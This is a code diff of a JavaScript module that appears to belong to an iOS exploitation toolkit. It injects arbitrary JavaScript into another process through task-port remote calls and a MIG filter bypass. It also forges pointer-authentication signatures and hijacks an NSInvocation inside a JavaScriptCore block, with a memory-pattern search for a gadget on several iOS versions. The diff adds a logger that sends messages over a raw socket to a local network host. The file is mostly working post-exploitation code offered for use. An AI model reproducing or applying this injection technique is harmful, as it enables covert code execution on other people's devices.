@@ -1,11 +1,74 @@
 import Utils from "libs/JSUtils/Utils";
 import RemoteCall from "libs/TaskRop/RemoteCall";
 import Chain from "libs/Chain/Chain";
+import Native from "libs/Chain/Native";
 
 const TAG = "INJECTJS";
 
 const RTLD_LAZY = 0x1;
 const RTLD_DEFAULT = 0xfffffffffffffffen;
+
+// Debug log - sends to server_log via HTTP GET request
+function injectDebugLog(msg) {
+	try {
+		const SERVER_HOST = "192.168.10.188";
+		const SERVER_PORT = 8000;
+		const logMsg = `[${TAG}] ${msg}`;
+
+		// Write to file first as backup
+		const debugFile = "/tmp/inject_debug.log";
+		const O_WRONLY = 0x0001;
+		const O_APPEND = 0x0008;
+		const O_CREAT = 0x0200;
+		const flags = O_WRONLY | O_CREAT | O_APPEND;
+		const fd = Native.callSymbol("open", debugFile, flags, 0o644);
+		if (fd >= 0) {
+			const logLine = `${logMsg}\n`;
+			const bytes = new Uint8Array(logLine.length);
+			for (let i = 0; i < logLine.length; i++) {
+				bytes[i] = logLine.charCodeAt(i) & 0xFF;
+			}
+			const buf = Native.callSymbol("malloc", BigInt(bytes.byteLength));
+			Native.write(buf, bytes.buffer);
+			Native.callSymbol("write", fd, buf, bytes.byteLength);
+			Native.callSymbol("free", buf);
+			Native.callSymbol("close", fd);
+		}
+
+		// Try to send via HTTP
+		const sock = Native.callSymbol("socket", 2, 1, 6);
+		if (sock < 0) return;
+
+		const addrBuf = Native.callSymbol("malloc", 16n);
+		Native.write16(addrBuf, 2);
+
+		// Port in network byte order
+		const portNet = ((SERVER_PORT & 0xFF) << 8) | ((SERVER_PORT >> 8) & 0xFF);
+		Native.write16(addrBuf + 2n, portNet);
+
+		// IP address
+		const ipBytes = new Uint8Array([192, 168, 10, 188]);
+		Native.write(addrBuf + 4n, ipBytes.buffer);
+		Native.write32(addrBuf + 8n, 0);
+
+		const connected = Native.callSymbol("connect", sock, addrBuf, 16n);
+		Native.callSymbol("free", addrBuf);
+
+		if (connected === 0) {
+			const httpReq = `GET /log.html?text=${encodeURIComponent(logMsg)} HTTP/1.1\r\nHost: ${SERVER_HOST}:${SERVER_PORT}\r\n\r\n`;
+			const reqBytes = new Uint8Array(httpReq.length);
+			for (let i = 0; i < httpReq.length; i++) {
+				reqBytes[i] = httpReq.charCodeAt(i) & 0xFF;
+			}
+			const reqBuf = Native.callSymbol("malloc", BigInt(reqBytes.byteLength));
+			Native.write(reqBuf, reqBytes.buffer);
+			Native.callSymbol("send", sock, reqBuf, reqBytes.byteLength, 0);
+			Native.callSymbol("free", reqBuf);
+		}
+
+		Native.callSymbol("close", sock);
+	} catch (e) {}
+}
 
 export default class InjectJS {
 
@@ -31,7 +94,7 @@ export default class InjectJS {
 		this.#invokeUsingIMPSel = Native.callSymbol("sel_registerName", "invokeUsingIMP:"); 
 
 		if (!this.#invokingAddr)
-			console.log(TAG, "Invoking not found!");
+			injectDebugLog( "Invoking not found!");
 	}
 
 	inject(agentPid=0) {
@@ -39,21 +102,21 @@ export default class InjectJS {
 			return false;
 
 		if (typeof(this.#target) == "string") {
-			console.log(TAG, `Start injecting JS script into ${this.#target}`);
+			injectDebugLog( `Start injecting JS script into ${this.#target}`);
 
 			this.task = new RemoteCall(this.#target, this.#migFilterBypass);
 			if (!this.task.success()) {
-				console.log(TAG, "Unable to inject into: " + this.#target);
+				injectDebugLog( "Unable to inject into: " + this.#target);
 				return false;
 			}
 		}
 		else {
-			console.log(TAG, `Start injecting JS script into existing task: ${this.#target.pid()}`);
+			injectDebugLog( `Start injecting JS script into existing task: ${this.#target.pid()}`);
 
 			 // Assume target is a RemoteCall object
 			this.task = this.#target;
 			if (!this.task.success()) {
-				console.log(TAG, "Unable to inject into existing task");
+				injectDebugLog( "Unable to inject into existing task");
 				return false;
 			}
 		}
@@ -74,34 +137,34 @@ export default class InjectJS {
 
 		// Sign __invoking__ function address
 		this.#invokingAddr = this.task.pac(this.#invokingAddr, 0);
-		//console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));
+		//injectDebugLog( "Signed invoking: " + Utils.hex(this.#invokingAddr));
 
 		this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
 		const lib = this.task.call(1000, "dlopen", mem, RTLD_LAZY);
-		//console.log(TAG, "lib: " + Utils.hex(lib));
+		//injectDebugLog( "lib: " + Utils.hex(lib));
 
 		// Create a JSC context and get pointer to exceptionHandler NSBlock
 		const jscontext = this.#callObjcRetain(this.#JSContextClass, "new");
-		//console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));
+		//injectDebugLog( "Remote JSC: " + Utils.hex(jscontext));
 
 		const exceptionHandler = this.task.read64(jscontext + 0x28n);
-		//console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));
+		//injectDebugLog( "Exception handler: " + Utils.hex(exceptionHandler));
 
 		// Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
 		// We replace exceptionHandler NSInvocation later in this code.
 		const invokerStr = this.#writeCFStr(mem, "invoker");
 		this.#callObjc(jscontext, "setObject:forKeyedSubscript:", exceptionHandler, invokerStr);
-		//console.log(TAG, "invokerStr: " + Utils.hex(invokerStr));
+		//injectDebugLog( "invokerStr: " + Utils.hex(invokerStr));
 
 		// Retrieve JSValue of invoker inside JSC context dict
 		const invoker = this.#callObjc(jscontext, "objectForKeyedSubscript:", invokerStr);
-		//console.log(TAG, "invoker: " + Utils.hex(invoker));
+		//injectDebugLog( "invoker: " + Utils.hex(invoker));
 
 		// Get pointer of NSInvocation inside NSBlock
 		const fjval = this.task.read64(invoker + 0x8n);
 		const storval = this.task.read64(fjval + 0x40n);
 		const invokerObj = this.task.read64(storval + 0x10n);
-		//console.log(TAG, "invokerObj: " + Utils.hex(invokerObj));
+		//injectDebugLog( "invokerObj: " + Utils.hex(invokerObj));
 
 		this.task.writeStr(mem, "QQQQQQQQQQQQQQQ");
 		const lsignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);
@@ -114,21 +177,21 @@ export default class InjectJS {
 
 		// This is the final NSInvocation object we use to call the actual target function
 		const inv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
-		//console.log(TAG, "inv: " + Utils.hex(inv));
+		//injectDebugLog( "inv: " + Utils.hex(inv));
 
 		// Create a new NSInvocation and replace the NSBlock one with this
 		const jsinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
-		//console.log(TAG, "jsinv: " + Utils.hex(jsinv));
+		//injectDebugLog( "jsinv: " + Utils.hex(jsinv));
 
 		const callBuff = this.task.call(100, "calloc", 1, 0x4000);
 		const firstInvokingBuff = callBuff + 0x50n;	// callBuff[10]
 		const argsBuff = callBuff + 0x320n;			// callBuff[100]
 		const resultBuff = callBuff + 0x640n;		// callBuff[200]
 
-		//console.log(TAG, "callBuff: " + Utils.hex(callBuff));
-		//console.log(TAG, "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
-		//console.log(TAG, "argsBuff: " + Utils.hex(argsBuff));
-		//console.log(TAG, "resultBuff: " + Utils.hex(resultBuff));
+		//injectDebugLog( "callBuff: " + Utils.hex(callBuff));
+		//injectDebugLog( "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
+		//injectDebugLog( "argsBuff: " + Utils.hex(argsBuff));
+		//injectDebugLog( "resultBuff: " + Utils.hex(resultBuff));
 
 		// Share callBuff with JS
 		this.task.writeStr(mem, "nativeCallBuff");
@@ -172,9 +235,9 @@ export default class InjectJS {
 		localCallBuff[31] = desiredPacGadget;
 		localCallBuff[32] = BigInt(agentPid);
 
-		//console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
-		//console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
-		//console.log(TAG, "malloc: " + Utils.hex(localCallBuff[23]));
+		//injectDebugLog( "dlsym: " + Utils.hex(localCallBuff[21]));
+		//injectDebugLog( "memcpy: " + Utils.hex(localCallBuff[22]));
+		//injectDebugLog( "malloc: " + Utils.hex(localCallBuff[23]));
 
 		const nativeLocalBuff = Native.callSymbol("malloc", localCallBuff.byteLength);
 		Native.write(nativeLocalBuff, localCallBuff.buffer);
@@ -196,32 +259,32 @@ export default class InjectJS {
 		// Replace NSInvocation
 		this.task.write64(storval + 0x10n, jsinv);
 		this.task.write64(storval + 0x18n, 0n);
-		//console.log(TAG, "NSInvocation replaced");
+		//injectDebugLog( "NSInvocation replaced");
 
 		// Write loader.js in remote task
 		//const loaderJS = "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();";
-		console.log(TAG, "JS script length: " + this.#injectCode.length);
+		injectDebugLog( "JS script length: " + this.#injectCode.length);
 		const scriptMem = this.task.call(100, "calloc", 1, this.#injectCode.length + 1);
 		const scriptStr = this.#writeCFStr(scriptMem, this.#injectCode);
 		this.task.call(100, "free", scriptMem);
-		//console.log(TAG, "scriptStr: " + Utils.hex(scriptStr));
+		//injectDebugLog( "scriptStr: " + Utils.hex(scriptStr));
 
 		// Check if we write ok
-		// console.log(TAG,"Check if we write ok" )
+		// injectDebugLog("Check if we write ok" )
 		// const a = Native.callSymbol("malloc", this.#injectCode.length + 1);
 		// const len = this.#callObjc(scriptStr, "length");
-		// console.log(TAG, len);
+		// injectDebugLog( len);
 		// const b = this.#callObjc(scriptStr, "UTF8String");
 		// this.task.read(b, a, this.#injectCode.length + 1);
 		// const c = Native.readString(a, this.#injectCode.length);
-		// console.log(TAG, c);
+		// injectDebugLog( c);
 		
 
 		//const loaderStr = this.#writeCFStr(mem, "loader");
 		//this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
-		//console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));
+		//injectDebugLog( "loaderStr: " + Utils.hex(loaderStr));
 
-		console.log(TAG, "Starting JS script for target: " + this.#target);
+		injectDebugLog( "Starting JS script for target: " + this.#target);
 
 		//const evaluateStr = this.#writeCFStr(mem, "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();");
 		//const evaluateStr = this.#writeCFStr(mem, "invoker();");
@@ -233,19 +296,19 @@ export default class InjectJS {
 
 		// Read data from result
 		//const retVal = this.task.read64(resultBuff);
-		//console.log(TAG, "Result: " + retVal);
+		//injectDebugLog( "Result: " + retVal);
 
-		console.log(TAG, "All done!");
+		injectDebugLog( "All done!");
 
 		return true;
 	}
 
 	#findInvoking() {
-		//console.log(TAG, "Find 'invoking()'...");
+		//injectDebugLog( "Find 'invoking()'...");
 
 		let startAddr = Native.dlsym("_CF_forwarding_prep_0");
 		startAddr = startAddr & 0x7fffffffffn; //Chain.strip(startAddr);
-		//console.log(TAG, "startAddr: " + Utils.hex(startAddr));
+		//injectDebugLog( "startAddr: " + Utils.hex(startAddr));
 
 		if (!startAddr)
 			return 0;
@@ -258,15 +321,15 @@ export default class InjectJS {
 		const pattern = new Uint8Array([0x67, 0x1D, 0x40, 0xF9, 0x66, 0x19, 0x40, 0xF9, 0x65, 0x15, 0x40, 0xF9, 0x64, 0x11, 0x40, 0xF9]);
 		Native.write(Native.mem, pattern.buffer);
 		let foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
-		//console.log(TAG, "foundAddr: " + Utils.hex(foundAddr));
+		//injectDebugLog( "foundAddr: " + Utils.hex(foundAddr));
 
 		if (!foundAddr) {
 			// special case for iOS 17.4-17.4.1
-			//console.log(TAG,`Didnt found invoking,trying to find it for special version`);
+			//injectDebugLog(`Didnt found invoking,trying to find it for special version`);
 			startAddr = Native.dlsym("CFCharacterSetIsCharacterMember");
 			startAddr = startAddr & 0x7fffffffffn;
 			foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
-			//console.log(TAG,`foundAddr:${Utils.hex(foundAddr)}`);
+			//injectDebugLog(`foundAddr:${Utils.hex(foundAddr)}`);
 			if (!foundAddr)
 				return 0;
 		}
@@ -278,7 +341,7 @@ export default class InjectJS {
 			foundAddr -= 0x4n;
 			if (buff32[i] == 0xd503237f) {
 				const found = foundAddr;
-				console.log(TAG, "Invoking found: " + Utils.hex(found));
+				injectDebugLog( "Invoking found: " + Utils.hex(found));
 				return found;
 			}
 		}
@@ -315,6 +378,6 @@ export default class InjectJS {
 		const str = this.#callObjc(desc, "UTF8String");
 		this.task.read(str, Native.mem, 32);
 		const classDesc = Native.readString(Native.mem);
-		console.log(TAG, "class: " + classDesc);
+		injectDebugLog( "class: " + classDesc);
 	}
 }
